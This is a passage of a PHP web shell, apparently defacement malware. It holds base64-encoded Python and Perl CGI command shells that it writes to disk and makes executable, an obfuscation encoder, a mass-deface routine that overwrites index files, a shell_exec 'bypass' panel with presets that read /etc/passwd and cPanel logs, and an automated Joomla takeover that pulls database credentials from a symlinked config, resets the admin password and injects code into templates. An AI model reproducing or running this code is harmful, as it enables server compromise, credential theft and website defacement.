CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
ICAgICAgY2hpbGRfc3RkaW4uY2xvc2UoKQogICAgICAgICAgICByZXN1bHQgPSBjaGlsZF9zdGRv
dXQucmVhZCgpCiAgICAgICAgICAgIGNoaWxkX3N0ZG91dC5jbG9zZSgpCiAgICAgICAgICAgIHBy
aW50IHJlc3VsdC5yZXBsYWNlKCdcbicsICc8QlI+JykKCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlv
biwgZTogICAgICAgICAgICAgICAgICAgICAgIyBhbiBlcnJvciBpbiBleGVjdXRpbmcgdGhlIGNv
bW1hbmQKICAgICAgICAgICAgcHJpbnQgZXJyb3JtZXNzCiAgICAgICAgICAgIGYgPSBTdHJpbmdJ
TygpCiAgICAgICAgICAgIHByaW50X2V4YyhmaWxlPWYpCiAgICAgICAgICAgIGEgPSBmLmdldHZh
bHVlKCkuc3BsaXRsaW5lcygpCiAgICAgICAgICAgIGZvciBsaW5lIGluIGE6CiAgICAgICAgICAg
ICAgICBwcmludCBsaW5lCgogICAgcHJpbnQgYm9keWVuZAoKCiIiIgpUT0RPL0lTU1VFUwoKCgpD
SEFOR0VMT0cKCjA3LTA3LTA0ICAgICAgICBWZXJzaW9uIDEuMC4wCkEgdmVyeSBiYXNpYyBzeXN0
ZW0gZm9yIGV4ZWN1dGluZyBzaGVsbCBjb21tYW5kcy4KSSBtYXkgZXhwYW5kIGl0IGludG8gYSBw
cm9wZXIgJ2Vudmlyb25tZW50JyB3aXRoIHNlc3Npb24gcGVyc2lzdGVuY2UuLi4KIiIi';
    $file = fopen('python.izo', 'w+');
    $write = fwrite($file, base64_decode($pythonp));
    fclose($file);
    chmod('python.izo', 0755);
    echo ' <iframe src=python/python.izo width=96% height=76% frameborder=0></iframe>
 
 </div>';
}
//////////////////////////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('string' == $_GET['x'])) {
    $text = $_POST['code']; ?><center><br><br><b>+--=[ Script Encode & Decode ]=--+</b><br><br>
<form method="post"><br><br><br>
<textarea class='inputz' cols=80 rows=10 name="code"></textarea><br><br>
<select class='inputz' size="1" name="ope">
<option value="base64">Base64</option>
<option value="gzinflate">str_rot13 - gzinflate - base64</option>
<option value="str">str_rot13 - gzinflate - str_rot13 - base64</option>
</select>&nbsp;<input class='inputzbut' type='submit' name='submit' value='Encrypt'>
<input class='inputzbut' type='submit' name='submits' value='Decrypt'>
</form>

<?php
    $submit = $_POST['submit'];
    if (isset($submit)) {
        $op = $_POST['ope'];
        switch ($op) {
            case 'base64':
                $codi = base64_encode($text);
            break;
            case 'str':
                $codi = (base64_encode(str_rot13(gzdeflate(str_rot13($text)))));
            break;
            case 'gzinflate':
                $codi = base64_encode(gzdeflate(str_rot13($text)));
            break;
            default:
            break;
        }
    }
    $submit = $_POST['submits'];
    if (isset($submit)) {
        $op = $_POST['ope'];
        switch ($op) {
            case 'base64':
                $codi = base64_decode($text);
            break;
            case 'str':
                $codi = str_rot13(gzinflate(str_rot13(base64_decode(($text)))));
            break;
            case 'gzinflate':
                $codi = str_rot13(gzinflate(base64_decode($text)));
            break;
            default:
            break;
        }
    }
    echo '<textarea cols=80 rows=10 class="inputz" readonly>' . $codi . '</textarea></center><BR><BR>';
}
/////////////////////////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('mass' == $_GET['x'])) {
    echo '<center/><br/><b><font color=#428bca>-=[ Mass Deface ]=-</font></b><br>';
    error_reporting(0); ?>
<form ENCTYPE="multipart/form-data" action="<?php $_SERVER['PHP_SELF']; ?>" method='post'>
<td><table><table class="tabnet" >
<form hethot='post'>
<tr>
	<tr>
	<td>&nbsp;&nbsp;Folder</td><td><input class ='inputz' type='text' name='path' size='60' value="<?php echo getcwd(); ?>"></td>
	</tr><br>
	<tr>
	<td>file name</td><td><input class ='inputz' type='text' name='file' size='60' value="index.php"></td>
	</tr>
</tr>
<th colspan='2'><b>Index code</b></th><br></table>
<textarea style='background:black;outline:none;' name='index' rows='10' cols='67'></textarea><br>
<center><input class='inputzbut' type='submit' value="&nbsp;&nbsp;Deface&nbsp;&nbsp;"></center></form></table><br></form>

<?php $mainpath = $_POST[path];
    $file = $_POST[file];
    $dir = opendir("$mainpath");
    $code = base64_encode($_POST[index]);
    $indx = base64_decode($code);
    while ($row = readdir($dir)) {
        $start = @fopen("$row/$file", 'w+');
        $finish = @fwrite($start, $indx);
        if ($finish) {
            echo "$row/$file > Done<br><br>";
        }
    }
}
//////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////
/////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('bypass' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=bypass" method="post">

<?php
    echo '<center/><br/><b><font color=#428bca>-=[ Command  Bypass Exploit ]=-</font></b><br>
';
    print_r('
<pre>
<form method="POST" action="">
<b><font color=#428bca><b><font color="#428bca">Command  :=) </font></font></b><input name="baba" type="text" class="inputz" size="34"><input type="submit" class="inputzbut" value="Go">
</form>
<form method="POST" action=""><strong><b><font color="#428bca">Menu Bypass  :=)  </font></strong><select name="liz0" size="1" class="inputz">
<option value="cat /etc/passwd">/etc/passwd</option>
<option value="netstat -an | grep -i listen">netstat</option>
<option value="cat /var/cpanel/accounting.log">/var/cpanel/accounting.log</option>
<option value="cat /etc/syslog.conf">/etc/syslog.conf</option>
<option value="cat /etc/hosts">/etc/hosts</option>
<option value="cat /etc/named.conf">/etc/named.conf</option>
<option value="cat /etc/httpd/conf/httpd.conf">/etc/httpd/conf/httpd.conf</option>
</select> <input type="submit" class="inputzbut" value="G&ouml;">
</form>
</pre>
');
    ini_restore('safe_mode');
    ini_restore('open_basedir');
    $liz0 = shell_exec($_POST[baba]);
    $liz0zim = shell_exec($_POST[liz0]);
    $uid = shell_exec('id');
    $server = shell_exec('uname -a');
    echo '<pre><h4>';
    echo $liz0;
    echo $liz0zim;
    echo '</h4></pre>';
    '</div>';
}
///////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('jodexer' == $_GET['x'])) {
    ?>
<form action="?y=<?php echo $pwd; ?>&amp;x=jodexer" method="post">

<?php
    function randomt()
    {
        $chars = 'abcdefghijkmnopqrstuvwxyz023456789';
        srand((float) microtime() * 1000000);
        $i = 0;
        $pass = '';
        while ($i <= 7) {
            $num = rand() % 33;
            $tmp = substr($chars, $num, 1);
            $pass = $pass . $tmp;
            ++$i;
        }

        return $pass;
    }
    function entre2v2($text, $marqueurDebutLien, $marqueurFinLien, $i = 1)
    {
        $ar0 = explode($marqueurDebutLien, $text);
        $ar1 = explode($marqueurFinLien, $ar0[$i]);
        $ar = trim($ar1[0]);

        return $ar;
    }
    if ($_POST['form_action']) {
        $text = file_get_contents($_POST['file']);
        $username = entre2v2($text, "public $user = '", "';");
        $password = entre2v2($text, "public $password = ', '", "';");
        $dbname = entre2v2($text, "public $db = ', '", "';");
        $dbprefix = entre2v2($text, "public $dbprefix = '", "';");
        $site_url = ($_POST['site_url']);
        $h = "<? echo(stripslashes(base64_decode('" . urlencode(base64_encode(str_replace("'", "'", ($_POST['code'])))) . "'))); exit; ?>";
        $co = randomt();
        /*
        echo($username);
        echo("<br>");
        echo($password);
        echo("<br>");
        echo($dbname);
        echo("<br>");
        echo($dbprefix);
        echo("<br>");
        */
        $co = randomt();
        if ($_POST['form_action']) {
            $h = "<? echo(stripslashes(base64_decode('" . urlencode(base64_encode(str_replace("'", "'", ($_POST['code'])))) . "'))); exit; ?>";
            $link = mysql_connect('dzoed.druknet.bt', $username, $password);
            mysql_select_db($dbname, $link);
            $tryChaningInfo = mysql_query('UPDATE ' . $dbprefix . "users SET username ='admin' , password = '2a9336f7666f9f474b7a8f67b48de527:DiWqRBR1thTQa2SvBsDqsUENrKOmZtAX'");
            echo '<br>[+] Changing admin password to 123456789';
            $req = mysql_query('SELECT * from  `' . $dbprefix . 'extensions` ');
            if ($req) {
                //################################################################
                //#####################        V1.6         ######################
                //################################################################
                $req = mysql_query('SELECT * from  `' . $dbprefix . "template_styles` WHERE client_id='0' and home='1'");
                $data = mysql_fetch_array($req);
                $template_name = $data['template'];
                $req = mysql_query('SELECT * from  `' . $dbprefix . "extensions` WHERE name='" . $template_name . "'");
                $data = mysql_fetch_array($req);
                $template_id = $data['extension_id'];
                $url2 = $site_url . '/index.php';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                $return = entre2v2($buffer, '<input type="hidden" name="return" value="', '"');
                $hidden = entre2v2($buffer, '<input type="hidden" name="', '" value="1"', 4);
                ///////////////////////////
                $url2 = $site_url . '/index.php';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'username=admin&passwd=123456789&option=com_login&task=login&return=' . $return . '&' . $hidden . '=1');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                $pos = strpos($buffer, 'com_config');
                if (false === $pos) {
                    echo '<br>[-] Login Error';
                    exit;
                } else {
                    echo '<br>[~] Login Successful';
                }
                ///////////////////////////
                $url2 = $site_url . '/index.php?option=com_templates&task=source.edit&id=' . base64_encode($template_id . ':index.php');
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                $hidden2 = entre2v2($buffer, '<input type="hidden" name="', '" value="1"', 2);
                if ($hidden2) {
                    echo '<br>[+] index.php file founded in Theme Editor';
                } else {
                    echo '<br>[-] index.php Not found in Theme Editor';
                    exit;
                }
                echo '<br>[*] Updating Index.php .....';
                $url2 = $site_url . '/index.php?option=com_templates&layout=edit';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'jform[source]=' . $h . '&jform[filename]=index.php&jform[extension_id]=' . $template_id . '&' . $hidden2 . '=1&task=source.save');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                $pos = strpos($buffer, '<dd class="message message">');
                if (false === $pos) {
                    echo '<br>[-] Updating Index.php Error';
                    exit;
                } else {
                    echo '<br>[~] index.php successfully saved';
                }
                //################################################################
                //#####################      V1.6  END      ######################
                //################################################################
            } else {
                //################################################################
                //#####################      V1.5           ######################
                //################################################################
                $req = mysql_query('SELECT * from  `' . $dbprefix . "templates_menu` WHERE client_id='0'");
                $data = mysql_fetch_array($req);
                $template_name = $data['template'];
                $url2 = $site_url . '/index.php';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 1);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                $hidden = entre2v2($buffer, '<input type="hidden" name="', '" value="1"', 3);
                $url2 = $site_url . '/index.php';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'username=admin&passwd=123456789&option=com_login&task=login&' . $hidden . '=1');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                $pos = strpos($buffer, 'com_config');
                if (false === $pos) {
                    echo '<br>[-] Login Error';
                    exit;
                } else {
                    echo '<br>[+] Login Successful';
                }
                ///////////////////////////
                $url2 = $site_url . '/index.php?option=com_templates&task=edit_source&client=0&id=' . $template_name;
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                $hidden2 = entre2v2($buffer, '<input type="hidden" name="', '" value="1"', 6);
                if ($hidden2) {
                    echo '<br>[~] index.php file founded in Theme Editor';
                } else {
                    echo '<br>[-] index.php Not found in Theme Editor';
                }
                echo '<br>[*] Updating Index.php .....';
                $url2 = $site_url . '/index.php?option=com_templates&layout=edit';
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $url2);
                curl_setopt($ch, CURLOPT_POST, 1);
                curl_setopt($ch, CURLOPT_POSTFIELDS, 'filecontent=' . $h . '&id=' . $template_name . '&cid[]=' . $template_name . '&' . $hidden2 . '=1&task=save_source&client=0');
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_setopt($ch, CURLOPT_USERAGENT, $useragent);
                curl_setopt($ch, CURLOPT_COOKIEJAR, $co);
                curl_setopt($ch, CURLOPT_COOKIEFILE, $co);
                $buffer = curl_exec($ch);
                $pos = strpos($buffer, '<dd class="message message fade">');
                if (false === $pos) {
                    echo '<br>[-] Updating Index.php Error';
                    exit;
                } else {
                    echo '<br>[~] index.php successfully saved';
                }
                //################################################################
                //#####################      V1.5  END      ######################
                //################################################################
            }
        }
        function randomt()
        {
            $chars = 'abcdefghijkmnopqrstuvwxyz023456789';
            srand((float) microtime() * 1000000);
            $i = 0;
            $pass = '';
            while ($i <= 7) {
                $num = rand() % 33;
                $tmp = substr($chars, $num, 1);
                $pass = $pass . $tmp;
                ++$i;
            }

            return $pass;
        }
        function entre2v2($text, $marqueurDebutLien, $marqueurFinLien, $i = 1)
        {
            $ar0 = explode($marqueurDebutLien, $text);
            $ar1 = explode($marqueurFinLien, $ar0[$i]);
            $ar = trim($ar1[0]);

            return $ar;
        }
    } ?>
    <center><br><br>
    <font color="#428bca" size='+3'><b>+--=[ Automatic Joomla Index Changer ]=--+</b></font><br><br>
    </center>
    <center><b>
    Link of symlink configuration.php of Joomla<br></b>
    <FORM action=""  method="post">
    <input type="hidden" name="form_action" value="1">
     <input type="text" class="inputz" size="60" name="file" value="http://site.com/sym/home/user/public_html/configuration.php">
    <br>
    <br><b>
    Admin Control panel url</b><br>
    <input type="text" class="inputz" size="40" name="site_url" value="http://site/administrator"><br>
    <br><b>
    Your Index Code</b>
    <br>
    <TEXTAREA rows="20" align="center" style="background:black" cols="120" name="code"> your index code
            </TEXTAREA>
            <br>
    <INPUT  class="inputzbut" type="submit" value="Lets Go Deface !!!" name="Submit">
    </FORM>
     </center>
    <script language=JavaScript>m='%09%09%09%09%09%09%09%3C/td%3E%0A%09%09%09%09%09%09%3C/tr%3E%0A%09%09%09%09%09%3C/table%3E%0A%09%09%09%09%3C/td%3E%0A%3C/html%3E';d=unescape(m);document.write(d);</script>
	<?php
}
///////////////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('cgi4e' == $_GET['x'])) {
    echo '<center/><br/><b>
 +--==[ CGI-Telnet Version 1.4 ]==--+ 
 </b><br><br>';
    mkdir('cgi4e', 0755);
    chdir('cgi4e');
    $kokdosya = '.htaccess';
    $dosya_adi = "$kokdosya";
    $dosya = fopen($dosya_adi, 'w') or die('Dosya a&#231;&#305;lamad&#305;!');
    $metin = 'AddType application/x-httpd-cgi .izo
AddType application/x-httpd-cgi .izo

AddHandler cgi-script .izo
AddHandler cgi-script .izo';
    fwrite($dosya, $metin);
    fclose($dosya);
    $cgi4e = 'IyEvdXNyL2Jpbi9wZXJsIC1JL3Vzci9sb2NhbC9iYW5kbWluDQp1c2UgTUlNRTo6QmFzZTY0Ow0KJFZlcnNpb249ICJDR0ktVGVsbmV0IFZlcnNpb24gMS40IjsNCiRFZGl0UGVyc2lvbj0iQmxvb2RTZWN1cml0eSI7DQoNCiRQYXNzd29yZCA9ICJkNHJrajFuIjsJCQkjIENoYW5nZSB0aGlzLiBZb3Ugd2lsbCBuZWVkIHRvIGVudGVyIHRoaXMNCgkJCQkjIHRvIGxvZ2luLg0Kc3ViIElzX1dpbigpew0KCSRvcyA9ICZ0cmltKCRFTlZ7IlNFUlZFUl9TT0ZUV0FSRSJ9KTsNCglpZigkb3MgPX4gbS93aW4vaSl7DQoJCXJldHVybiAxOw0KCX1lbHNlew0KCQlyZXR1cm4gMDsNCgl9DQp9DQokV2luTlQgPSAmSXNfV2luKCk7CQkJIyBZb3UgbmVlZCB0byBjaGFuZ2UgdGhlIHZhbHVlIG9mIHRoaXMgdG8gMSBpZg0KCQkJCQkjIHlvdSdyZSBydW5uaW5nIHRoaXMgc2NyaXB0IG9uIGEgV2luZG93cyBOVA0KCQkJCQkjIG1hY2hpbmUuIElmIHlvdSdyZSBydW5uaW5nIGl0IG9uIFVuaXgsIHlvdQ0KCQkJCQkjIGNhbiBsZWF2ZSB0aGUgdmFsdWUgYXMgaXQgaXMuDQoNCiROVENtZFNlcCA9ICImIjsJCQkjIFRoaXMgY2hhcmFjdGVyIGlzIHVzZWQgdG8gc2VwZXJhdGUgMiBjb21tYW5kcw0KCQkJCQkjIGluIGEgY29tbWFuZCBsaW5lIG9uIFdpbmRvd3MgTlQuDQoNCiRVbml4Q21kU2VwID0gIjsiOwkJCSMgVGhpcyBjaGFyYWN0ZXIgaXMgdXNlZCB0byBzZXBlcmF0ZSAyIGNvbW1hbmRzDQoJCQkJCSMgaW4gYSBjb21tYW5kIGxpbmUgb24gVW5peC4NCg0KJENvbW1hbmRUaW1lb3V0RHVyYXRpb24gPSAxMDsJCSMgVGltZSBpbiBzZWNvbmRzIGFmdGVyIGNvbW1hbmRzIHdpbGwgYmUga2lsbGVkDQoJCQkJCSMgRG9uJ3Qgc2V0IHRoaXMgdG8gYSB2ZXJ5IGxhcmdlIHZhbHVlLiBUaGlzIGlzDQoJCQkJCSMgdXNlZnVsIGZvciBjb21tYW5kcyB0aGF0IG1heSBoYW5nIG9yIHRoYXQNCgkJCQkJIyB0YWtlIHZlcnkgbG9uZyB0byBleGVjdXRlLCBsaWtlICJmaW5kIC8iLg0KCQkJCQkjIFRoaXMgaXMgdmFsaWQgb25seSBvbiBVbml4IHNlcnZlcnMuIEl0IGlzDQoJCQkJCSMgaWdub3JlZCBvbiBOVCBTZXJ2ZXJzLg0KDQokU2hvd0R5bmFtaWNPdXRwdXQgPSAxOwkJCSMgSWYgdGhpcyBpcyAxLCB0aGVuIGRhdGEgaXMgc2VudCB0byB0aGUNCgkJCQkJIyBicm93c2VyIGFzIHNvb24gYXMgaXQgaXMgb3V0cHV0LCBvdGhlcndpc2UNCgkJCQkJIyBpdCBpcyBidWZmZXJlZCBhbmQgc2VuZCB3aGVuIHRoZSBjb21tYW5kDQoJCQkJCSMgY29tcGxldGVzLiBUaGlzIGlzIHVzZWZ1bCBmb3IgY29tbWFuZHMgbGlrZQ0KCQkJCQkjIHBpbmcsIHNvIHRoYXQgeW91IGNhbiBzZWUgdGhlIG91dHB1dCBhcyBpdA0KCQkJCQkjIGlzIGJlaW5nIGdlbmVyYXRlZC4NCg0KIyBET04nVCBDSEFOR0UgQU5ZVEhJTkcgQkVMT1cgVEhJUyBMSU5FIFVOTEVTUyBZT1UgS05PVyBXSEFUIFlPVSdSRSBET0lORyAhIQ0KDQokQ21kU2VwID0gKCRXaW5OVCA/ICROVENtZFNlcCA6ICRVbml4Q21kU2VwKTsNCiRDbWRQd2QgPSAoJFdpbk5UID8gImNkIiA6ICJwd2QiKTsNCiRQYXRoU2VwID0gKCRXaW5OVCA/ICJcXCIgOiAiLyIpOw0KJFJlZGlyZWN0b3IgPSAoJFdpbk5UID8gIiAyPiYxIDE+JjIiIDogIiAxPiYxIDI+JjEiKTsNCiRjb2xzPSAxMzA7DQokcm93cz0gMjY7DQojLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tDQojIFJlYWRzIHRoZSBpbnB1dCBzZW50IGJ5IHRoZSBicm93c2VyIGFuZCBwYXJzZXMgdGhlIGlucHV0IHZhcmlhYmxlcy4gSXQNCiMgcGFyc2VzIEdFVCwgUE9TVCBhbmQgbXVsdGlwYXJ0L2Zvcm0tZGF0YSB0aGF0IGlzIHVzZWQgZm9yIHVwbG9hZGluZyBmaWxlcy4NCiMgVGhlIGZpbGVuYW1lIGlzIHN0b3JlZCBpbiAkaW57J2YnfSBhbmQgdGhlIGRhdGEgaXMgc3RvcmVkIGluICRpbnsnZmlsZWRhdGEnfS4NCiMgT3RoZXIgdmFyaWFibGVzIGNhbiBiZSBhY2Nlc3NlZCB1c2luZyAkaW57J3Zhcid9LCB3aGVyZSB2YXIgaXMgdGhlIG5hbWUgb2YNCiMgdGhlIHZhcmlhYmxlLiBOb3RlOiBNb3N0IG9mIHRoZSBjb2RlIGluIHRoaXMgZnVuY3Rpb24gaXMgdGFrZW4gZnJvbSBvdGhlciBDR0kNCiMgc2NyaXB0cy4NCiMtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0NCnN1YiBSZWFkUGFyc2UgDQp7DQoJbG9jYWwgKCppbikgPSBAXyBpZiBAXzsNCglsb2NhbCAoJGksICRsb2MsICRrZXksICR2YWwpOw0KCSRNdWx0aXBhcnRGb3JtRGF0YSA9ICRFTlZ7J0NPTlRFTlRfVFlQRSd9ID1+IC9tdWx0aXBhcnRcL2Zvcm0tZGF0YTsgYm91bmRhcnk9KC4rKSQvOw0KCWlmKCRFTlZ7J1JFUVVFU1RfTUVUSE9EJ30gZXEgIkdFVCIpDQoJew0KCQkkaW4gPSAkRU5WeydRVUVSWV9TVFJJTkcnfTsNCgl9DQoJZWxzaWYoJEVOVnsnUkVRVUVTVF9NRVRIT0QnfSBlcSAiUE9TVCIpDQoJew0KCQliaW5tb2RlKFNURElOKSBpZiAkTXVsdGlwYXJ0Rm9ybURhdGEgJiAkV2luTlQ7DQoJCXJlYWQoU1RESU4sICRpbiwgJEVOVnsnQ09OVEVOVF9MRU5HVEgnfSk7DQoJfQ0KCSMgaGFuZGxlIGZpbGUgdXBsb2FkIGRhdGENCglpZigkRU5WeydDT05URU5UX1RZUEUnfSA9fiAvbXVsdGlwYXJ0XC9mb3JtLWRhdGE7IGJvdW5kYXJ5PSguKykkLykNCgl7DQoJCSRCb3VuZGFyeSA9ICctLScuJDE7ICMgcGxlYXNlIHJlZmVyIHRvIFJGQzE4NjcgDQoJCUBsaXN0ID0gc3BsaXQoLyRCb3VuZGFyeS8sICRpbik7IA0KCQkkSGVhZGVyQm9keSA9ICRsaXN0WzFdOw0KCQkkSGVhZGVyQm9keSA9fiAvXHJcblxyXG58XG5cbi87DQoJCSRIZWFkZXIgPSAkYDsNCgkJJEJvZHkgPSAkJzsNCiAJCSRCb2R5ID1+IHMvXHJcbiQvLzsgIyB0aGUgbGFzdCBcclxuIHdhcyBwdXQgaW4gYnkgTmV0c2NhcGUNCgkJJGlueydmaWxlZGF0YSd9ID0gJEJvZHk7DQoJCSRIZWFkZXIgPX4gL2ZpbGVuYW1lPVwiKC4rKVwiLzsgDQoJCSRpbnsnZid9ID0gJDE7IA0KCQkkaW57J2YnfSA9fiBzL1wiLy9nOw0KCQkkaW57J2YnfSA9fiBzL1xzLy9nOw0KDQoJCSMgcGFyc2UgdHJhaWxlcg0KCQlmb3IoJGk9MjsgJGxpc3RbJGldOyAkaSsrKQ0KCQl7IA0KCQkJJGxpc3RbJGldID1+IHMvXi4rbmFtZT0kLy87DQoJCQkkbGlzdFskaV0gPX4gL1wiKFx3KylcIi87DQoJCQkka2V5ID0gJDE7DQoJCQkkdmFsID0gJCc7DQoJCQkkdmFsID1+IHMvKF4oXHJcblxyXG58XG5cbikpfChcclxuJHxcbiQpLy9nOw0KCQkJJHZhbCA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSRpbnska2V5fSA9ICR2YWw7IA0KCQl9DQoJfQ0KCWVsc2UgIyBzdGFuZGFyZCBwb3N0IGRhdGEgKHVybCBlbmNvZGVkLCBub3QgbXVsdGlwYXJ0KQ0KCXsNCgkJQGluID0gc3BsaXQoLyYvLCAkaW4pOw0KCQlmb3JlYWNoICRpICgwIC4uICQjaW4pDQoJCXsNCgkJCSRpblskaV0gPX4gcy9cKy8gL2c7DQoJCQkoJGtleSwgJHZhbCkgPSBzcGxpdCgvPS8sICRpblskaV0sIDIpOw0KCQkJJGtleSA9fiBzLyUoLi4pL3BhY2soImMiLCBoZXgoJDEpKS9nZTsNCgkJCSR2YWwgPX4gcy8lKC4uKS9wYWNrKCJjIiwgaGV4KCQxKSkvZ2U7DQoJCQkkaW57JGtleX0gLj0gIiIgaWYgKGRlZmluZWQoJGlueyRrZXl9KSk7DQoJCQkkaW57JGtleX0gLj0gJHZhbDs